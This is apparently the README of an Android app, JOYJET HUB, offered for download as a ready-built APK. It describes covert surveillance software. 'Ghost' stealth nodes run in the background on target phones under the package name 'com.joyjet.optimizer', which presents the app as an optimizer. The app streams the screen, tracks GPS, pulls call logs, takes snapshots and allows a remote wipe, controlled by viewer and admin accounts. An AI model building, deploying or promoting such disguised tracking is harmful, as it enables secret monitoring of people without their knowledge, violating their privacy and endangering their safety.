# 🚀 JOYJET HUB

React Native (Expo) mobile application for real-time surveillance and monitoring.

---

## ⚡ Features

- **HD Screen Streaming** - WebRTC peer-to-peer live screen sharing
- **GPS Tracking** - Real-time location on dark-mode tactical map
- **Remote Commands** - Admin can trigger snapshots, call logs, system wipe
- **Hardware Telemetry** - Battery, network, signal strength monitoring

---

## 📱 Roles

| Role       | Description                                           |
| ---------- | ----------------------------------------------------- |
| **Admin**  | Full control - live video, map, captures, remote wipe |
| **Viewer** | Monitor up to 3 assigned ghost nodes                  |
| **Ghost**  | Stealth node - runs in background                     |

### ⚠️ Important: Registration Order

1. **Viewer must connect FIRST** - Create viewer account before ghosts
2. **Ghost prefix must match viewer** - Ghost name: `VIEWERNAME_suffix`
3. **Max 3 ghosts per viewer** - Each viewer can monitor max 3 ghost nodes

### Authentication

| Role   | Username     | Requirements                                       |
| ------ | ------------ | -------------------------------------------------- |
| Admin  | `admin`      | Use server's `ADMIN_SECRET_KEY`                    |
| Viewer | Min 4 chars  | Connect before ghosts                              |
| Ghost  | `Alpha_Test` | Prefix must match existing viewer, suffix ≥4 chars |

---

## 📥 Download APK

### Latest Release

**[Download app-release.apk](https://github.com/guru9/joyjet-hub/releases/latest/download/app-release.apk)**

### All Releases

Visit the [Releases Page](https://github.com/guru9/joyjet-hub/releases) for all available versions.

---

## 🛠️ Setup

```bash
# Install dependencies
npm install

# Start development server
npx expo start

# Build Android APK
npm run android
```

---

## 📋 Server Configuration

This app connects to the joyjet-server. Update the server URL in:

- `src/services/socket.js`

Default server: `https://joyjet-server.onrender.com`

---

## 📦 Build APK

Automated builds via GitHub Actions:

1. Push to main branch
2. Go to **Actions** tab
3. Download `app-release.apk` from artifacts

---

## 📋 App Configuration

Edit `app.json` for app settings:

| Setting      | Value                  |
| ------------ | ---------------------- |
| Package Name | `com.joyjet.optimizer` |
| Min SDK      | 30 (Android 11)        |
| Target SDK   | 35 (Android 15)        |
| Version      | 4.2.6                  |

### Required Permissions

- Camera
- Microphone
- Location (Fine + Background)
- Call Log
- Phone State
- Storage (Media Projection)

---

## 🔧 Tech Stack

| Technology       | Version |
| ---------------- | ------- |
| React Native     | 0.83.1  |
| Expo             | 55.0.0  |
| Socket.IO Client | 4.8.3   |
| WebRTC           | 124.0.7 |
| React Navigation | 7.0.0   |

---

## 📄 License

ISC - GURU
